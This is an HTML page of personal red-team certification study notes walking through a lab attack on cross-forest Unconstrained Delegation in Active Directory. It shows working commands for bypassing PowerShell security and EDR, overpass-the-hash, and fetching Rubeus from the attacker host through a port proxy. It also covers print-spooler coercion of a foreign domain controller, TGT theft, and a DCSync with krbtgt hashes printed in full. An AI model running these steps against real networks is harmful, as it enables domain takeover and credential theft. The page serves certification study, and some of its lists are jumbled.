@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cross Forest Attacks - Unconstrained Delegation | Mr Stark Study Notes</title>
+  <link rel="shortcut icon" href="../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .goad-content { max-width: 100%; margin: 0 auto; padding: 30px; font-size: 20px; }
+    .goad-content h1 { color: var(--white-2); font-size: 36px; margin-bottom: 25px; }
+    .goad-content h2 { color: var(--orange-yellow-crayola); font-size: 30px; margin: 35px 0 20px 0; padding-bottom: 10px; border-bottom: 1px solid var(--jet); }
+    .goad-content h3 { color: var(--white-1); font-size: 26px; margin: 30px 0 15px 0; }
+    .goad-content h4 { color: var(--white-2); font-size: 24px; margin: 25px 0 15px 0; }
+    .goad-content p { color: var(--light-gray); margin-bottom: 18px; line-height: 1.8; font-size: 20px; word-wrap: break-word; overflow-wrap: break-word; }
+    .goad-content code { background: var(--onyx); color: var(--orange-yellow-crayola); padding: 3px 8px; border-radius: 4px; font-family: 'Courier New', monospace; font-size: 18px; }
+    .goad-content pre { background: var(--eerie-black-2); border: 1px solid var(--jet); border-radius: 8px; padding: 20px; overflow-x: auto; margin: 20px 0; }
+    .goad-content pre code { background: transparent; color: var(--light-gray); padding: 0; font-size: 18px; }
+    .goad-content ul, .goad-content ol { margin: 20px 0; padding-left: 30px; }
+    .goad-content li { color: var(--light-gray); margin-bottom: 10px; font-size: 20px; line-height: 1.8; }
+    .goad-content img { max-width: 100%; border-radius: 8px; margin: 25px 0; border: 1px solid var(--jet); }
+    .goad-content blockquote { border-left: 4px solid var(--orange-yellow-crayola); padding-left: 20px; margin: 20px 0; color: var(--light-gray-70); }
+    .goad-content hr { border: none; border-top: 1px solid var(--jet); margin: 40px 0; }
+    .goad-content table { width: 100%; border-collapse: collapse; margin: 25px 0; font-size: 18px; }
+    .goad-content th, .goad-content td { border: 1px solid var(--jet); padding: 12px; text-align: left; color: var(--light-gray); }
+    .goad-content th { background: var(--eerie-black-2); color: var(--white-2); font-weight: 500; }
+    .part-navigation { display: flex; justify-content: space-between; margin-top: 50px; padding-top: 30px; border-top: 1px solid var(--jet); }
+    .part-navigation a { color: var(--orange-yellow-crayola); text-decoration: none; font-size: 18px; display: flex; align-items: center; gap: 8px; }
+    .part-navigation a:hover { text-decoration: underline; }
+    .goad-sidebar-list { list-style: none; padding: 0; margin: 0; }
+    .goad-sidebar-list li { margin-bottom: 8px; }
+    .goad-sidebar-list a { color: var(--light-gray); text-decoration: none; font-size: 14px; display: block; padding: 5px 0; transition: color 0.25s ease; }
+    .goad-sidebar-list a:hover { color: var(--orange-yellow-crayola); }
+    .back-link { display: flex; align-items: center; gap: 8px; color: var(--orange-yellow-crayola); text-decoration: none; font-size: 14px; margin-bottom: 15px; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTE Series</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Parts</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <a href="../index.html" class="back-link">
+          <ion-icon name="arrow-back-outline"></ion-icon>
+          Back to Portfolio
+        </a>
+        <div class="separator"></div>
+        <p style="color: var(--light-gray); font-size: var(--fs-7); margin-bottom: 10px;">Jump to Part:</p>
+        <ul class="goad-sidebar-list">
+<li><a href="part-01-introduction.html">Part 1: Part 1</a></li>
+<li><a href="part-02-enumeration.html">Part 2: Part 2</a></li>
+<li><a href="part-03-privilege-escalation.html">Part 3: Part 3</a></li>
+<li><a href="part-04-kerberoasting-attack.html">Part 4: Part 4</a></li>
+<li><a href="part-05-privilege-escalation-targeted-kerberoasting.html">Part 5: Part 5</a></li>
+<li><a href="part-06-privilege-escalation-laps-local-administrator-pass.html">Part 6: Part 6</a></li>
+<li><a href="part-07-dumping-lsass-credentials.html">Part 7: Part 7</a></li>
+<li><a href="part-08-privilege-escalation-gmsa-attack.html">Part 8: Part 8</a></li>
+<li><a href="part-09-lsass-attack-with-mde-bypass.html">Part 9: Part 9</a></li>
+<li><a href="part-10-pass-the-certificates-attack.html">Part 10: Part 10</a></li>
+<li><a href="part-11-privilege-escalation---unconstraine.html">Part 11: Privilege Escalation - Unconstrained Delegation</a></li>
+<li><a href="part-12-privilege-escalation---constrained-.html">Part 12: Privilege Escalation - Constrained Delegation</a></li>
+<li><a href="part-13-privilege-escalation---rbcd.html">Part 13: Privilege Escalation - RBCD</a></li>
+<li><a href="part-14-domain-persistence---golden-ticket-.html">Part 14: Domain Persistence - Golden Ticket Attack</a></li>
+<li><a href="part-15-domain-persistence---silver-ticket-.html">Part 15: Domain Persistence - Silver Ticket Attack</a></li>
+<li><a href="part-16-domain-persistence---diamond-ticket.html">Part 16: Domain Persistence - Diamond Ticket Attack</a></li>
+<li><a href="part-17-domain-persistence---skeleton-key-a.html">Part 17: Domain Persistence - Skeleton Key Attack</a></li>
+<li><a href="part-18-domain-persistence---sapphire-ticke.html">Part 18: Domain Persistence - Sapphire Ticket Attack</a></li>
+<li><a href="part-19-domain-persistence---adminsdholder-.html">Part 19: Domain Persistence - AdminSDHolder Attack</a></li>
+<li><a href="part-20-cross-domain-attacks---active-direc.html">Part 20: Cross Domain Attacks - Active Directory Certificate</a></li>
+<li><a href="part-21-shadow-credentials---abusing-user-o.html">Part 21: Shadow Credentials - Abusing User Object</a></li>
+<li><a href="part-22-cross-domain-attacks---unconstraine.html">Part 22: Cross Domain Attacks - Unconstrained Delegation</a></li>
+<li><a href="part-23-cross-domain-attacks---attacking-az.html">Part 23: Cross Domain Attacks - Attacking Azure AD Integration</a></li>
+<li><a href="part-24-cross-domain-attacks---child-to-for.html">Part 24: Cross Domain Attacks - Child To Forest Root SID History</a></li>
+<li><a href="part-25-cross-domain-attacks---child-to-for.html">Part 25: Cross Domain Attacks - Child To Forest Root SID History (Part 2)</a></li>
+<li><a href="part-26-cross-forest-attacks---kerberoast-a.html">Part 26: Cross Forest Attacks - Kerberoast Attack</a></li>
+<li><a href="part-27-cross-forest-attacks---constrained-.html">Part 27: Cross Forest Attacks - Constrained Delegation</a></li>
+<li><a href="part-28-cross-forest-attacks---unconstraine.html" style="color: var(--orange-yellow-crayola);">Part 28: Cross Forest Attacks - Unconstrained Delegation</a></li>
+<li><a href="part-29-cross-forest-attacks---trust-key-ab.html">Part 29: Cross Forest Attacks - Trust Key Abuse</a></li>
+<li><a href="part-30-cross-forest-attacks---injecting-si.html">Part 30: Cross Forest Attacks - Injecting SID History</a></li>
+<li><a href="part-31-trust-abuse---mssql-servers-databas.html">Part 31: Trust Abuse - MSSQL Servers Database Links</a></li>
+<li><a href="part-32-cross-forest-attacks---foreign-secu.html">Part 32: Cross Forest Attacks - Foreign Security Principals</a></li>
+<li><a href="part-33-cross-forest-attacks---abusing-pam.html">Part 33: Cross Forest Attacks - Abusing PAM</a></li>
+<li><a href="part-34-cross-forest-attacks---trusting-to-.html">Part 34: Cross Forest Attacks - Trusting to Trusted Trust Key</a></li>
+<li><a href="part-35-cross-forest-attacks---abusing-trus.html">Part 35: Cross Forest Attacks - Abusing Trust Transitivity</a></li>
+        </ul>
+      </div>
+    </aside>
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <div class="goad-content">
+<h1>CRTE - Certified Red Team Expert</h1>
+<h2><strong>Cross Forest Attacks - Unconstrained Delegation</strong></h2>
+<p>Cross-forest attacks leveraging <strong>Unconstrained Delegation</strong> present a powerful way to escalate privileges across trusted Active Directory forests.</p>
+<p>Our focus is on understanding how this attack works, what conditions must be met, and how to execute it effectively in an offensive security context.</p>
+<p>Unconstrained Delegation is an AD feature that allows a computer or service to impersonate any user that authenticates to it. This feature relies on Kerberos authentication, a protocol used extensively in Windows environments. When a user or service authenticates to a system with Unconstrained Delegation enabled, their Ticket Granting Ticket (TGT) is stored in the memory of the system they connect to. The system can then use this TGT to act on behalf of the user and access other services in the network. For example, if a user authenticates to a file server with Unconstrained Delegation enabled, the server can use the user’s TGT to impersonate the user and access other network resources.</p>
+<p>To exploit this across a <strong>forest trust</strong>, we need to ensure that certain conditions are met. The most critical factor is the <strong>TGT Delegation setting</strong> on the trust between the forests. Historically, TGT delegation was enabled by default, but Microsoft changed this after vulnerabilities like the <strong>Printer Bug</strong> were discovered. However, if an environment has explicitly enabled TGT delegation for business reasons, it becomes a prime target for exploitation.</p>
+<p>For this attack to succeed, we need:</p>
+<ol>
+<li>A <strong>compromised machine</strong> in our forest with Unconstrained Delegation enabled.</li>
+<li>The <strong>ability to force a domain controller (DC) from the target forest</strong> to authenticate to this machine.</li>
+<li>A trust relationship between the forests with <strong>TGT delegation enabled</strong>.</li>
+</ol>
+<p>Once these conditions are met, we can exploit the delegation mechanism by tricking the <strong>domain controller from the target forest</strong> into authenticating to our compromised system. A common way to do this is by exploiting <strong>the Print Spooler service</strong> to force authentication. Once the DC connects, we extract its TGT, allowing us to impersonate it and escalate privileges.</p>
+<p>The attack follows a simple sequence:</p>
+<ol>
+<li>We compromise a machine that has <strong>Unconstrained Delegation</strong> enabled in our forest.</li>
+<li>We force a <strong>domain controller from the target forest</strong> to connect to this machine (via Printer Bug, SMB authentication coercion, etc.).</li>
+<li>We extract the <strong>TGT of the domain controller</strong> from memory using tools like <strong>Rubeus</strong>.</li>
+<li>We use the stolen TGT to perform further attacks, such as a <strong>DCSync attack</strong>, to dump credentials, including the <strong>KRBTGT hash</strong> of the target forest.</li>
+</ol>
+<p>Once we obtain the KRBTGT hash, we effectively control the target forest, as we can now forge <strong>Golden Tickets</strong> for persistence.</p>
+<p>In a real-world scenario, we might see this attack play out in a setup where an <strong>external vendor</strong> (e.g., <code>US-vendor.local</code>) has a <strong>two-way trust</strong> with a corporate network (<code>techcorp.local</code>). If Unconstrained Delegation is enabled in the vendor’s network and TGT delegation is allowed across the trust, we can escalate our access from the vendor’s compromised machine to a <strong>domain controller in techcorp.local</strong>, ultimately leading to full domain compromise.</p>
+<p>Detection of this attack can be difficult, but some red flags include:</p>
+<ul>
+<li><strong>Machines with Unconstrained Delegation enabled</strong> in Active Directory.</li>
+<li><strong>Unexpected authentication requests</strong> from domain controllers to machines they don’t typically interact with.</li>
+<li><strong>Kerberos TGTs appearing on non-DC systems</strong>, which suggests delegation abuse.</li>
+</ul>
+<p>The security impact of a successful cross-forest Unconstrained Delegation attack is severe. It allows us to <strong>compromise an entire external forest</strong>, pivot laterally, and escalate privileges far beyond the original foothold. Since TGTs are effectively <strong>the keys to the kingdom</strong>, controlling a domain controller’s TGT means we can authenticate as any user in that forest.</p>
+<p>Mastering this attack requires an in-depth understanding of <strong>Kerberos delegation</strong>, <strong>TGT delegation settings</strong>, <strong>forest trust relationships</strong>, and <strong>how to coerce authentication from a DC</strong>. Once we can reliably trigger this authentication and extract TGTs, we have a direct path to privilege escalation across forests.</p>
+<h1>Enumerating Unconstrained Delegation with ADModule</h1>
+<p>Let’s start our Unconstrained Delegation with ADModule by executing InvisiShell to bypass PowerShell security features like system-wide transcription, Script Block Logging, AMSI and Constrained Language Mode(CLM).</p>
+<p><code>RunWithRegistryNonAdmin.bat</code></p>
+<img src="./images/screenshot_333.png" alt="image">
+<p>After bypassing Powershell Security Features we can now import ADModule.</p>
+<p><code>Import-Module Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dllImport-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</code></p>
+<img src="./images/screenshot_334.png" alt="image">
+<p>We can now start enumerating Unconstrained Delegation. The command we will use, will enumerate if there’s any computer in our target domain with <strong>Unconstrained Delegation </strong>enabled.</p>
+<p><code>Get-ADComputer -Filter {TrustedForDelegation -eq $True}</code></p>
+<img src="./images/screenshot_335.png" alt="image">
+<ul>
+<li><strong>DistinguishedName</strong>:</li>
+<li>This is the LDAP path to the computer object in Active Directory. It includes the organizational unit (OU) or container where the object resides, as well as the domain name. For example, <code>CN=US-DC,OU=Domain Controllers,DC=us,DC=techcorp,DC=local</code> indicates that the <code>US-DC</code> computer is in the "Domain Controllers" OU within the <code>us.techcorp.local</code> domain.</li>
+<li><strong>DNSHostName</strong>:</li>
+<li>This is the fully qualified domain name (FQDN) of the computer in the AD domain. For example, <code>US-DC.us.techcorp.local</code> represents the FQDN for the <code>US-DC</code> computer.</li>
+<li><strong>Enabled</strong>:</li>
+<li>This indicates whether the computer account is active (True) or disabled (False). Both computers in your output are active since <code>Enabled</code> is set to <code>True</code>.</li>
+<li><strong>Name</strong>:</li>
+<li>This is the NetBIOS name of the computer, such as <code>US-DC</code> or <code>US-WEB</code>. It's the shorter, non-FQDN identifier used within the domain.</li>
+<li><strong>ObjectClass</strong>:</li>
+<li>This indicates the type of object in Active Directory. In this case, the value is <code>computer</code>, meaning the objects being queried are computer accounts.</li>
+<li><strong>ObjectGUID</strong>:</li>
+<li>This is the globally unique identifier (GUID) of the computer object in Active Directory. Every AD object has a unique GUID to distinguish it, regardless of its name or location.</li>
+<li><strong>SamAccountName</strong>:</li>
+<li>This is the Security Account Manager (SAM) name of the computer object. By convention, it is the NetBIOS name of the computer followed by a <code>$</code> sign, such as <code>US-DC$</code> or <code>US-WEB$</code>. The <code>$</code> sign indicates that it's a computer account, not a user account.</li>
+<li><strong>SID (Security Identifier)</strong>:</li>
+<li>This is the unique security identifier assigned to the computer object in the domain. It is used to identify the object in access control lists (ACLs) and other security contexts.</li>
+<li><strong>UserPrincipalName</strong>:</li>
+</ul>
+</ul>
+<p>We can see above that we do have do have 2 computers in our target domain that have the flag <code>TrustedForDelegation</code> enabled.</p>
+<p>In this case we have <code>US-DC</code> and <code>US-WEB</code> with <strong>Unconstrained Delegation</strong> configured. Since we were able to compromise the <code>US-WEB</code> host on the previous lab, we can explore <strong>Unconstrained Delegation</strong> on <code>US-WEB</code> host.</p>
+<ul>
+<li>This field is typically used for user accounts and contains the user’s logon name in email format (e.g., <code>user@domain.com</code>). For computer accounts, this field is often empty, as seen in your output.</li>
+</ul>
+</ul>
+<h2>Enumerating Inter-Forest trusts With PowerView</h2>
+<p>Let’s start by importing PowerView module using Import-Module command and enumerate the inter-realm trusts that we do have so far.</p>
+<p><code>Import-Module .\PowerView.ps1</code></p>
+<p>The following command will return a list of trusted forests and their details.</p>
+<p><code>Get-NetForestTrust</code></p>
+<img src="./images/screenshot_336.png" alt="image">
+<p>We can see that there is a <strong>bidirectional trust</strong> between <code>techcorp.local</code> and <code>usvendor.local</code>. This means that authentication requests can flow in both directions, allowing users and services from one forest to authenticate in the other.</p>
+<p>We can start by elevating our privilege as US-WEB using OverPass-The-Hash attack using webmaster’s AES256 with Rubeus.</p>
+<p>User: <strong>webmaster</strong></p>
+<p>NTLM_Hash: <strong>1d49d390ac01d568f0ee9be82bb74d4c</strong></p>
+<p>AES256: <strong>2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0</strong></p>
+<p>Let’s start by  encoding our Rubeus argument(<code>asktgt</code>) using ArgSplit.bat</p>
+<p><code>ArgSplit.bat</code></p>
+<img src="./images/screenshot_337.png" alt="image">
+<p>After doing a Copy/Paste of the encoded argument we can run our Rubeus.exe in the memory using Loader.exe.</p>
+<p><code>C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args "%Pwn%" /user:webmaster /aes256:2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p>
+<p>We can see that our ticket has been successfully imported. Now that we do have elevated our as webmaster let’s use Find-PSRemotingLocalAdminAccess to find out if our user has Local Admin access on any machine inside our target domain.</p>
+<img src="./images/screenshot_338.png" alt="image">
+<p>We can see above that webmaster has local admin access inside US-WEB host.</p>
+<p>I also tried to make the same enumeration using <code>Find-LocalAdminAccess</code> from PowerView module but I was not able to find the same result. <code>Find-LocalAdminAccess</code> did not bring US-Web as a valid host that webmaster has local Admin Access.</p>
+<p><code>Import-Module .\PowerView.ps1</code></p>
+<img src="./images/screenshot_339.png" alt="image">
+<h3><strong>Key Differences</strong></h3>
+<ol>
+<li><code>Find-PSRemotingLocalAdminAccess</code>:</li>
+<ul>
+<li>It specifically checks for local administrator access <strong>via PowerShell Remoting (WinRM)</strong>.</li>
+<li>It requires WinRM to be enabled and properly configured on the target machines.</li>
+<li>If WinRM is blocked by a firewall or not enabled, the tool may not give accurate results or fail to connect.</li>
+<li><code>Find-LocalAdminAccess</code><strong> (PowerView)</strong>:</li>
+</ul>
+</ol>
+<p><strong>Let’s move on…</strong></p>
+<ul>
+<li>It checks local administrator access <strong>based on LDAP enumeration</strong>.</li>
+<li>This method does not rely on WinRM but instead queries group membership via domain enumeration.</li>
+<li>If WinRM isn't working but LDAP data is accessible, this method may yield results that differ from <code>Find-PSRemotingLocalAdminAccess</code>.</li>
+</ul>
+</ul>
+<h3>Mapping Shares to local system</h3>
+<p>Let’s start by Mapping shares from remote servers to our local system to allow seamless access to the target machine's files as if they were stored locally.</p>
+<p>This is useful for tasks like transferring payloads, extracting sensitive data, or staging tools for further exploitation. We will use this approach to be able to transfer files to our target <code>US-WEB</code>.</p>
+<p><strong>Advantages:</strong></p>
+<ol>
+<li><strong>Convenience</strong>: It simplifies interaction with the target's file system, enabling easy copying, reading, or modification of files.</li>
+<li><strong>Efficiency</strong>: File transfers and tool deployments are faster and more straightforward compared to manual uploads or downloads.</li>
+<li><strong>Persistence</strong>: The mapped drive can remain accessible for the session, allowing continuous interaction without repeatedly authenticating.</li>
+<li><strong>Stealth</strong>: Uses built-in Windows functionality, making the activity less suspicious to some monitoring tools.</li>
+</ol>
+<p>> **Note: If your mapping does not work on the one-liner passing the password on it, it’s probably due to special characters on the credential and you may get error Password i not correct.</p>
+<p>To bypass this, you can simply do the whole mapping command and put the password after it is asked.**</p>
+<p><code>net use x: \\US-WEB\C$\Users\Public\</code></p>
+<img src="./images/screenshot_340.png" alt="image">
+<p>Let’s now copy out .Net loader into our target host, we will be using this to run Rubeus in monitor mode in the memory.</p>
+<p><code>echo F | XCOPY C:\AD\Tools\Loader.exe x:Loader.exe</code></p>
+<img src="./images/screenshot_341.png" alt="image">
+<p>We were able to Copy our .Net loader into the target machine. We can now delete our mapped driver <code>x</code> created earlier.</p>
+<p><code>net use x: /delete</code></p>
+<img src="./images/screenshot_342.png" alt="image">
+<h2>PortForwarding to bypass EDR</h2>
+<p>To avoid being caught by any defensive mechanism, we can  simply create a PortForwarding on the target machine then call SafetyKatz using it’s localhost IP.</p>
+<p><code>winrs -r:US-WEB cmdnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=127.0.0.1 connectport=80 connectaddress=192.168.100.163</code></p>
+<img src="./images/screenshot_343.png" alt="image">
+<h3><strong>1. </strong><code>netsh interface portproxy add v4tov4</code><strong>:</strong></h3>
+<ul>
+<li><code>netsh interface portproxy</code><strong>:</strong> This is the part of the <code>netsh</code> utility that deals with port forwarding. It allows forwarding TCP traffic from one IP/port combination to another.</li>
+<li><code>add</code><strong>:</strong> Specifies that you're adding a new forwarding rule.</li>
+<li><code>v4tov4</code><strong>:</strong> Indicates that both the listening and connecting addresses use IPv4.</li>
+</ul>
+<h3><strong>2. </strong><code>listenport=8080</code><strong>:</strong></h3>
+<ul>
+<li>The port on the <strong>local machine (target machine)</strong> where the service will "listen" for incoming connections.</li>
+<li>In this case, the machine will listen on port <code>8080</code>.</li>
+</ul>
+<h3><strong>3. </strong><code>listenaddress=127.0.0.1</code><strong>:</strong></h3>
+<ul>
+<li>The IP address on the <strong>local machine</strong> where the service will listen for connections.</li>
+<li><code>0.0.0.0</code> means it will listen on all network interfaces available on the machine (e.g., public, private, or loopback IPs).</li>
+</ul>
+<h3><strong>4. </strong><code>connectport=80</code><strong>:</strong></h3>
+<ul>
+<li>The port on the <strong>remote machine (Out Attacking Machine)</strong> to which traffic will be forwarded.</li>
+<li>In this case, port <code>80</code> (commonly used for HTTP).</li>
+</ul>
+<h3><strong>5. </strong><code>connectaddress=192.168.100.163</code><strong>:</strong></h3>
+<ul>
+<li>The IP address of the <strong>remote machine (Our Attacking Machine)</strong>.</li>
+</ul>
+<p>This port forwarding setup redirects traffic received on port 8080 from our compromised machine to port 80 on our attacking macchine (192.168.100.163),  which acts as a bridge.</p>
+<p>We can check this portforwarding with the following command:</p>
+<p><code>nesh interface portproxy show all</code></p>
+<img src="./images/screenshot_344.png" alt="image">
+<h3>Disabling Defender</h3>
+<p>Before we carry on with the extraction of the LSASS credentials on our target host, we need to disable our firewall on our side. This way we can host the file on our machine with no issues, without having the firewall complaining.</p>
+<img src="./images/screenshot_345.png" alt="image">
+<p>I’m also hosting the Rubeus.exe file in my attacking machine using the HFS.exe software, but this could also be achieved with any other tools like python3 for example.</p>
+<p>For this next step, I need to encode the argument that will be passed to Rubeus<strong>.exe</strong>, specifically the <code>monitor</code> command, which I will use to run Rubeus from memory. Instead of passing the argument in plaintext, I am using <strong>ArgSplit.bat</strong> to obfuscate it.</p>
+<p>ArgSplit.bat works by breaking down and encoding the command using environment variable substitutions in Windows batch scripting. Each letter of the argument is assigned a variable, which is later reconstructed when the batch script executes. This technique helps evade detection by security solutions such as Microsoft Defender for Endpoint (MDE) and other Endpoint Detection and Response (EDR) tools, which often flag direct execution of known malicious commands.</p>
+<p><code>ArgSplit.bat</code></p>
+<img src="./images/screenshot_346.png" alt="image">
+<p>Let’s now put Rubeus in monitor mode targeting <code>usvendor-dc$</code> machine our eu.local</p>
+<p>> NOTE: Make sure that you use the DC name like usvendor-dc$ instead of full name like this usvendor-dc.usvendor.local. I tested many times and Coerce did not work,.</p>
+<p>Probably because we are dealing with an Inter-realm TGT Delegation.</p>
+<p><code>C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:usvendor-dc$ /interval:5 /nowrap</code></p>
+<img src="./images/screenshot_347.png" alt="image">
+<p>Our next step is to initiate the forced authentication of <code>usvendor-dc.usvendor.local</code> (the domain controller on usvendor.local) to my target machine <strong>US-WEB</strong>, which has <strong>Unconstrained Delegation enabled</strong>. To achieve this, I used <strong>MS-RPRN.exe</strong>, a tool that exploits the <strong>Print Spooler Bug (MS-RPRN coercion)</strong> to trick the domain controller into authenticating to my machine target machine (<code>US-WEB</code>).</p>
+<p><code>C:\AD\Tools\MS-RPRN.exe \\usvendor-dc.usvendor.local \\us-web.us.techcorp.local</code></p>
+<img src="./images/screenshot_348.png" alt="image">
+<p>If we get back to our Rubeus in monitor mode, we will see that now we got a new TGT and it’s from <code>usvendor-dc$</code> host.</p>
+<img src="./images/screenshot_349.png" alt="image">
+<p>This proves that <strong>Unconstrained Delegation worked exactly as expected</strong>. The moment <code>usvendor-dc$</code> was coerced into authenticating to my target system, its <strong>TGT was cached</strong>, allowing me to extract it.  Now that I have the <strong>Base64-encoded ticket.</strong></p>
+<p>Back to our attacking machine, we will quickly use ArgSplit.bat to encode our Rubeus.exe arguement (<code>ptt</code>) and simply do the copy/paste into our CMD session as we always do.</p>
+<p><code>ArgSplit.bat</code></p>
+<img src="./images/screenshot_350.png" alt="image">
+<p>we can move forward to the final step by <strong>importing the TGT into my session</strong> using <strong>Rubeus</strong>.</p>
+<p><code>Loader.exe -Path C:\AD\Tools\Rubeus.exe -args "%Pwn%" /ticket:</AddFullEncodedTGT></code></p>
+<img src="./images/screenshot_351.png" alt="image">
+<p>By injecting the <code>usvendor-dc$</code> ticket into my current session, I will be able to impersonate the <strong>domain controller</strong>, giving me access to privileged domain operations.</p>
+<p>The best way to fully compromise the Active Directory domain at this point is to execute a <strong>DCSync attack</strong>. With <strong>DCSync</strong>, I can request and retrieve <strong>password hashes for any account</strong>, including high-privileged users and even the <strong>KRBTGT account</strong>, which is the most critical account in any AD environment.</p>
+<p>If we check with <code>klist</code> command we can see the ticket imported.</p>
+<p><code>klist</code></p>
+<img src="./images/screenshot_352.png" alt="image">
+<h1>DCSync Attack</h1>
+<p>Executing <strong>DCSync</strong> allowed us to retrieve the <strong>KRBTGT account hashes</strong>, including <strong>NTLM and AES encryption keys</strong>. These hashes are the most valuable credentials in an Active Directory environment, as they allow me to generate <strong>Golden Tickets</strong>, which provide <strong>persistent and unlimited access</strong> to the domain.</p>
+<p>Before running the attack, I obfuscated the argument <strong>lsadump::dcsync</strong> using <strong>ArgSplit.bat</strong> to evade detection, ensuring that security solutions do not immediately flag my command execution.</p>
+<p><code>lsadump::dcsync</code></p>
+<img src="./images/screenshot_353.png" alt="image">
+<p>This final step proves the core concept behind <strong>Unconstrained Delegation exploitation, </strong>simply compromising a machine with this misconfiguration <strong>does not automatically</strong> lead to full domain compromise. Instead, the key to success lies in <strong>coercing a privileged account, such as the domain controller (</strong><code>usvendor$</code><strong>), to authenticate to the compromised machine with Unconstrained Delegation</strong>. Once that happens, the <strong>TGT of the privileged account is cached in memory</strong>, allowing for extraction and full domain takeover.</p>
+<p>`C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:us\krbtgt" "exit”bash</p>
+<p>mimikatz(commandline) # lsadump::dcsync /user:usvendor\krbtgt /domain:usvendor.local</p>
+<p>[DC] 'usvendor.local' will be the domain</p>
+<p>[DC] 'USVendor-DC.usvendor.local' will be the DC server</p>
+<p>[DC] 'usvendor\krbtgt' will be the user account</p>
+<p>[rpc] Service  : ldap</p>
+<p>[rpc] AuthnSvc : GSS_NEGOTIATE (9)</p>
+<p>Object RDN           : krbtgt</p>
+<p><strong> SAM ACCOUNT </strong></p>
+<p>SAM Username         : krbtgt</p>
+<p>Account Type         : 30000000 ( USER_OBJECT )</p>
+<p>User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</p>
+<p>Account expiration   :</p>
+<p>Password last change : 7/12/2019 9:09:18 PM</p>
+<p>Object Security ID   : S-1-5-21-2028025102-2511683425-2951839092-502</p>
+<p>Object Relative ID   : 502</p>
+<p>Credentials:</p>
+<p>Hash NTLM: 335caf1a29240a5dd318f79b6deaf03f</p>
+<p>ntlm- 0: 335caf1a29240a5dd318f79b6deaf03f</p>
+<p>lm  - 0: f3e8466294404a3eef79097e975bda3b</p>
+<p>Supplemental Credentials:</p>
+<p><em> Primary:NTLM-Strong-NTOWF </em></p>
+<p>Random Value : 11d7fc894b21e11d24a81c7870eb8aae</p>
+<p><em> Primary:Kerberos-Newer-Keys </em></p>
+<p>Default Salt : USVENDOR.LOCALkrbtgt</p>
+<p>Default Iterations : 4096</p>
+<p>Credentials</p>
+<p>aes256_hmac       (4096) : 2b0b8bf77286337369f38d1d72d3705fda18496989ab1133b401821684127a79</p>
+<p>aes128_hmac       (4096) : 71995c47735a10ea4a107bfe2bf38cb6</p>
+<p>des_cbc_md5       (4096) : 982c3125f116b901</p>
+<p><em> Primary:Kerberos </em></p>
+<p>Default Salt : USVENDOR.LOCALkrbtgt</p>
+<p>Credentials</p>
+<p>des_cbc_md5       : 982c3125f116b901</p>
+<p><em> Packages </em></p>
+<p>NTLM-Strong-NTOWF</p>
+<p><em> Primary:WDigest </em></p>
+<p>01  99585c6025e58e1ac33c85f8a9ff8d18</p>
+<p>02  c8dd05c8afc5d2b401e42ee135e7322f</p>
+<p>03  b8ada0a86cd88445cea44dc839be89e2</p>
+<p>04  99585c6025e58e1ac33c85f8a9ff8d18</p>
+<p>05  c8dd05c8afc5d2b401e42ee135e7322f</p>
+<p>06  f1a9058fe1f96297d9358a6ee70f3d0a</p>
+<p>07  99585c6025e58e1ac33c85f8a9ff8d18</p>
+<p>08  3e9f24f6600eb0613abf6a827e1579b4</p>
+<p>09  3e9f24f6600eb0613abf6a827e1579b4</p>
+<p>10  b31d574308dfbfc7359959269c9e062f</p>
+<p>11  1e1b957757cfb97ea2cb6abaa00d37e4</p>
+<p>12  3e9f24f6600eb0613abf6a827e1579b4</p>
+<p>13  4c60e3254aa38c7eab2cc87ee5936665</p>
+<p>14  1e1b957757cfb97ea2cb6abaa00d37e4</p>
+<p>15  35105693dc1e8604a2e6d83fc4df54d5</p>
+<p>16  35105693dc1e8604a2e6d83fc4df54d5</p>
+<p>17  ce56ccf6a0d06664c7283ba6ab6f45b5</p>
+<p>18  d6724265605922c57a12aae62411cddf</p>
+<p>19  398eadef9fd48e9dd8574597d99a5e1e</p>
+<p>20  50bcfec6ba9dd547d848b6795597fc66</p>
+<p>21  5415bba00be1f4d402e290b87a5dc0a4</p>
+<p>22  5415bba00be1f4d402e290b87a5dc0a4</p>
+<p>23  040c18e4aa28bb2aeca69502bd1ce9da</p>
+<p>24  fdd7b9a41f5392c5850c447dc26524a5</p>
+<p>25  fdd7b9a41f5392c5850c447dc26524a5</p>
+<p>26  3e58897c36a6045ceda494ecf08da9d9</p>
+<p>27  689dca94f881ecba2ce4a13a1c9d2a26</p>
+<p>28  0864b3b7df08ba05d95c877570a62ef7</p>
+<p>29  7daa8ba2616ae1f75d9a7e9fe6cddc17</p>
+<p>mimikatz(commandline) # exit</p>
+<p>`</p>
